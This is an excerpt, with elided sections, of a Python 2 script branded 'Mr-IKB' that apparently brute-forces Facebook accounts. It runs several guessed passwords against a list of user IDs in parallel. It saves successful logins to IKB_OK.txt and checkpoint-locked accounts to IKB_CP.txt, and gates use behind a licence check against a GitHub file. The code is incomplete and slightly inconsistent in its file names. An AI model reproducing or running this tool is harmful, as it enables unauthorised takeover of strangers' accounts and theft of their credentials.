...
def reg():
    ...
    r = requests.get('https://raw.githubusercontent.com/imtiazik/XD/main/server.txt').text
    if to in r:
...
def log_menu_s():
    s = raw_input(' \033[1;97m╰─Mr-IKB➤ ')
    if s == '1':
        log_fb()
    elif s == '2':
        log_token()
    elif s == '3':
        os.system('xdg-open https://facebook.com/Imtiaz.offcial/')
    else:
        print ''
...
def menu():
    ...
    print '\033[1;92m[2] Follow Mr-IKB'
...
def a_s():
    ...
    cps = []
    oks = []
    a_s = raw_input(' \033[1;97m╰─Mr-IKB➤ ')
    if a_s == '1':
        os.system('clear')
        print logo
    ...
    def main(arg):
        ...
        try:
            ...
            q = json.loads(data)
            if 'loc' in q:
                print '\033[1;95m[IKB-OK]➤ ' + uid + ' | ' + pass1
                ok = open('/sdcard/ids/IKB_OK.txt', 'a')
                ok.write(uid + ' | ' + pass1 + '\n')
                ok.close()
                oks.append(uid + pass1)
            elif 'www.facebook.com' in q['error']:
                print '\033[1;97m[IKB-CP]➤ ' + uid + ' | ' + pass1
                cp = open('IKB_CP.txt', 'a')
                cp.write(uid + ' | ' + pass1 + '\n')
                cp.close()
                ...
                q = json.loads(data)
                if 'loc' in q:
                    print '\033[1;95m[IKB-OK]➤ ' + uid + ' | ' + pass2
                    ok = open('/sdcard/ids/IKB_OK.txt', 'a')
                    ok.write(uid + ' | ' + pass2 + '\n')
                    ok.close()
                    oks.append(uid + pass2)
                elif 'www.facebook.com' in q['error']:
                    print '\033[1;97m[IKB-CP]➤ ' + uid + ' | ' + pass2
                    cp = open('IKB_CP.txt', 'a')
                    cp.write(uid + ' | ' + pass2 + '\n')
                    cp.close()
                    ...
                    q = json.loads(data)
                    if 'loc' in q:
                        print '\033[1;95m[IKB-OK]➤ ' + uid + ' | ' + pass3
                        ok = open('/sdcard/ids/IK_OK.txt', 'a')
                        ok.write(uid + ' | ' + pass3 + '\n')
                        ok.close()
                        oks.append(uid + pass3)
                    elif 'www.facebook.com' in q['error']:
                        print '\033[1;97m[IKB-CP]➤ ' + uid + ' | ' + pass3
                        cp = open('IKB_CP.txt', 'a')
                        cp.write(uid + ' | ' + pass3 + '\n')
                        cp.close()
                        ...
                        q = json.loads(data)
                        if 'loc' in q:
                            print '\033[1;95m[IKB-OK]➤ ' + uid + ' | ' + pass4
                            ok = open('/sdcard/ids/IKB_OK.txt', 'a')
                            ok.write(uid + ' | ' + pass4 + '\n')
                            ok.close()
                            oks.append(uid + pass4)
                        elif 'www.facebook.com' in q['error']:
                            print '\033[1;97m[IKB-CP]➤ ' + uid + ' | ' + pass4
                            cp = open('IKB_CP.txt', 'a')
                            cp.write(uid + ' | ' + pass4 + '\n')
                            cp.close()
    ...
    p.map(main, id)
    print 47 * '-'
    print ' \033[1;92mMRP MEAN MR-IKB PROGRAMMING'
